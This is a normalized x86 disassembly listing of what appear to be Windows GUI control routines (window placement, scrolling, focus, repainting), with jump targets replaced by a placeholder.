setne al
mov edx eax
mov eax ebx
call sub_44d194
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44c70c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_447368
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4462a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44a940
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44c77c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448458
mov edx esi
mov eax ebx
call sub_449da4
pop esi
pop ebx
retn
sub_44c798
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_4436a0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_45e10c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40346c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40346c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40346c
test al al
jne r-xdata
sub_44c82c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e1c0
mov edx esi
mov eax ebx
call sub_44c798
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44790c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45e10c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44790c
test eax eax
jne r-xdata
jmp r-xdata
sub_44c910
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44790c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44c964
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44790c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45e10c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44790c
test eax eax
jne r-xdata
sub_44c9b0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44c798
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45e10c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44790c
test eax eax
jne r-xdata
sub_44ca0c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45e10c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44790c
mov [ esi + 0xc ] eax
sub_44ca40
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_445db8
mov eax ebx
mov si 0xffd0
call sub_40346c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_446104
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44cb18
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_449d48
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40346c
inc edi
dec ebx
jne r-xdata
sub_44cb60
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor eax eax
push ebp
push sub_44cbfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cb18
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc05
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44cc0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_449914
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_449d48
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44ccfc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4185ac
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418440
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4185cc
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418550
call sub_44d054
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418550
call sub_44d054
sub_44cdd4
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44ccfc
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44ce34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44d054
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_44d054
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
test eax eax
jne r-xdata
sub_44ce98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44790c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov eax ebx
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_449d48
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_449d48
test [ eax + 0x52 ] 0x4
je r-xdata
sub_44cf5c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_446104
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44cf94
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44cfd4
push ebx
mov ebx eax
mov eax ebx
call sub_45e10c
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_461f70
pop ebx
retn
mov eax ebx
call sub_45e134
mov eax ebx
call sub_44d054
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44d00c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d030
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44d030
sub_44d068
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416f14
mov eax edi
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_449d48
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44d0fc
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_44d054
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_44d134
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40346c
sub_44d1f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4185ac
pop esi
pop ebx
retn
sub_44d214
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d1f0
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418440
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4185cc
sub_44d288
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44d358
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44790c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44d2e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44d34c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d353
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40346c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4058c0
sub_44d364
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_445db8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44d41c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418550
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4183f4
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40346c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44d47c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44d572
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40346c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d579
mov eax [ ebp - 0x14 ]
call sub_403270
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4185ac
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418550
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44d588
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44d47c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44d5b4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44d47c
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44d47c
mov edx eax
mov eax esi
call sub_461e70
sub_44d5f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44d640
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44ccfc
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4469d4
sub_44d688
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44d70c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_449d84
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_44dace
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44d688
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
